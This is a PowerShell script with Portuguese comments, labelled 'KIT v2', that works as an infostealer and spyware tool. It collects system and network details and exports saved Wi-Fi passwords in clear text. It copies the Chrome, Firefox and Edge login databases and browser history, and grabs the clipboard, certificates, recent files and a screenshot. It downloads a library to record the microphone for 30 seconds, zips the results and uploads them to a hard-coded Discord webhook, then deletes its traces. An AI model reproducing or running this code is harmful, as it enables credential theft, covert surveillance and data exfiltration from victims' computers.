# ----------
# KIT v2 – coleta tudo, não apaga nada do sistema, só limpa a pasta $env:TEMP\kit
# ----------
$kit = "$env:TEMP\kit"
$hook = "https://discord.com/api/webhooks/1458595316336037923/LcenEw4uom3H_-llTphqVq0Rr2uLqyFwSAk3HJ7E1UCWoCEL-wJ1Qp4HDcHdlSH7vYkV"

New-Item -ItemType Directory -Path $kit -Force | Out-Null

function Out-Kit {
    param($param) Invoke-Expression $param
}

# 1) Sistema & HW
Out-Kit { systeminfo } | Out-File "$kit\sysinfo.txt" -Encoding UTF8
Out-Kit { Get-CimInstance Win32_ComputerSystem } | Out-File "$kit\hw.txt" -Encoding UTF8
Out-Kit { Get-CimInstance Win32_Processor } | Out-File "$kit\cpu.txt" -Encoding UTF8
Out-Kit { Get-CimInstance Win32_BIOS } | Out-File "$kit\bios.txt" -Encoding UTF8

# 2) Rede & Wi-Fi
Out-Kit { Get-NetIPConfiguration } | Out-File "$kit\netip.txt" -Encoding UTF8
netsh wlan export profile key=clear folder="$kit" | Out-Null

# 3) Contas & privilégios
Out-Kit { Get-CimInstance Win32_UserAccount } | Out-File "$kit\users.txt" -Encoding UTF8
Out-Kit { net localgroup administradores } | Out-File "$kit\admins.txt" -Encoding UTF8
Out-Kit { Get-EventLog Security -InstanceId 4624 -New 200 } | Out-File "$kit\logons.txt" -Encoding UTF8

# 4) Navegadores – login & histórico
$browserPaths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
    "$env:APPDATA\Mozilla\Firefox\Profiles\*.default*\logins.json",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
)
$browserPaths | ?{ Test-Path $_ } | %{ Copy-Item $_ "$kit\$(Split-Path -Leaf $_)-$(Get-Random).db" -ErrorAction SilentlyContinue }

# 5) Certificados pessoais
Out-Kit { Get-ChildItem Cert:\CurrentUser\My | Select Subject,Thumbprint,NotAfter } | Out-File "$kit\mycerts.txt" -Encoding UTF8

# 6) Clipboard atual
Out-Kit { Get-Clipboard } | Out-File "$kit\clipboard.txt" -Encoding UTF8

# 7) Arquivos recentes
Out-Kit { Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" | Select Name,LastWriteTime } | Out-File "$kit\recent.txt" -Encoding UTF8

# 8) Lista drives & “top 500” arquivos interessantes
Out-Kit { Get-PSDrive -PSProvider FileSystem } | Out-File "$kit\drives.txt" -Encoding UTF8
$exts = ".pdf",".doc*",".xls*",".txt",".csv",".db",".sqlite",".pst"
Get-ChildItem C:\ -Include $exts -Recurse -Depth 2 -ErrorAction SilentlyContinue |
    Select FullName,Length,LastWriteTime |
    Sort Length -Descending |
    Select -First 500 |
    Export-Csv "$kit\top_files.csv" -NoTypeInformation

# 9) Screenshot
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
$g = [System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen(0,0,0,0,$bmp.Size)
$pathSS = "$kit\screenshot.jpg"
$bmp.Save($pathSS, [System.Drawing.Imaging.ImageFormat]::Jpeg)

# 10) Microfone (30 s, gravação simples via NAudio)
$naudioUrl = "https://github.com/naudio/NAudio/releases/download/v2.0.1/NAudio.dll"
$naudioPath = "$kit\NAudio.dll"
if (-not (Test-Path $naudioPath)) {
    Invoke-WebRequest $naudioUrl -OutFile $naudioPath
}
Add-Type -Path $naudioPath
$wave = New-Object NAudio.Wave.WaveInEvent
$wave.WaveFormat = New-Object NAudio.Wave.WaveFormat(16000, 1)
$writer = [NAudio.Wave.WaveFileWriter]::new("$kit\mic.wav", $wave.WaveFormat)
$wave.add_DataAvailable({ param($s,$e) $writer.Write($e.Buffer, 0, $e.BytesRecorded) })
$wave.StartRecording()
Start-Sleep 30
$wave.StopRecording(); $writer.Dispose(); $wave.Dispose()

# 11) Compacta tudo
$zip = "$env:TEMP\kit_$(Get-Date -Format yyyyMMdd_HHmmss).zip"
Compress-Archive -Path "$kit\*" -Destination $zip -Force

# 12) Envia para o Discord
$body = @{
    file = Get-Item $zip
    content = "Kit $(hostname) – $(Get-Date)"
}
Invoke-RestMethod -Uri $hook -Method Post -Form $body

# 13) Limpa só a pasta $kit (nada do sistema é tocado)
Remove-Item $kit -Recurse -Force
